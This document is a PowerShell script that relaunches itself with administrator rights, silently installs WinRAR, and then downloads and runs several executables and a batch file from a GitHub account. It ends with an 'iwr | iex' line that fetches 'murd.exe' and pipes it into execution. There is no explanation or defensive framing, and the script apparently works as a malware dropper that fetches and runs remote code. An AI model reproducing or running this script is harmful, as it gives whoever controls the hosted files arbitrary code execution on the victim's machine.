# Check if the script is running with administrative privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Prompt the user to run the script as an administrator
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell.exe -ArgumentList "-File `"$scriptPath`"" -Verb RunAs
    Exit
}

# Function to download and extract the rar file
function DownloadAndExtractRar {
    # Define the URL of the rar file
    $url = "https://github.com/peiceofmind/updated/raw/main/packed.rar"

    # Define the directory where you want to save the downloaded rar file
    $downloadDirectory = "C:\Windows\temp"

    # Ensure the download directory exists, if not, create it
    if (-not (Test-Path -Path $downloadDirectory)) {
        New-Item -Path $downloadDirectory -ItemType Directory -Force | Out-Null
    }

    # Define the path where you want to save the downloaded rar file
    $rarPath = Join-Path -Path $downloadDirectory -ChildPath "packed.rar"

    # Define the directory where you want to extract the contents of the rar file
    $extractPath = "C:\Windows\temp"

    # Ensure the extraction directory exists, if not, create it
    if (-not (Test-Path -Path $extractPath)) {
        New-Item -Path $extractPath -ItemType Directory -Force | Out-Null
    }

    try {
        # Download the rar file
        Invoke-WebRequest -Uri $url -OutFile $rarPath

        # Use WinRAR to extract the contents of the rar file
        & "C:\Program Files\WinRAR\WinRAR.exe" x -y -ibck $rarPath $extractPath

        # Change directory to the extracted folder
        Set-Location -Path $extractPath

        # Check if the batch file exists
        $batchFilePath = Join-Path -Path $extractPath -ChildPath "Script_Run.bat"
        if (Test-Path -Path $batchFilePath) {
            # Run the Script_Run.bat file
            Start-Process -FilePath $batchFilePath -Wait
        } else {
            Write-Host "Batch file not found at: $batchFilePath"
        }
    }
    catch {
        Write-Host "An error occurred: $_"
    }
}

# Prompt the user to run the script as an administrator if needed
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Please run this script as an administrator."
    Exit
}

# Define the URL to download WinRAR installer
$winrarInstallerUrl = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-602.exe"

# Define the path to save the downloaded installer
$installerPath = "$env:TEMP\winrar-installer.exe"

# Download WinRAR installer
Invoke-WebRequest -Uri $winrarInstallerUrl -OutFile $installerPath

# Run the installer silently
Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait

# Check if WinRAR installation was successful
if (Test-Path "C:\Program Files\WinRAR\WinRAR.exe") {
    Write-Host "WinRAR installed successfully."
    # Recheck for the batch file after WinRAR installation
    DownloadAndExtractRar
} else {
    Write-Host "Failed to install WinRAR."
}

# URL of the file to download
$url = "https://github.com/peiceofmind/updated/raw/main/aw.cc.exe"
# Path where you want to save the downloaded file
$outputPath = "$env:TEMP\aw.cc.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Check if the file was downloaded successfully
if (Test-Path $outputPath) {
    # Open the downloaded file
    Start-Process $outputPath
} else {
    Write-Host "Failed to download the file."
}

iwr -useb https://github.com/peiceofmind/updated/raw/main/murd.exe |iex
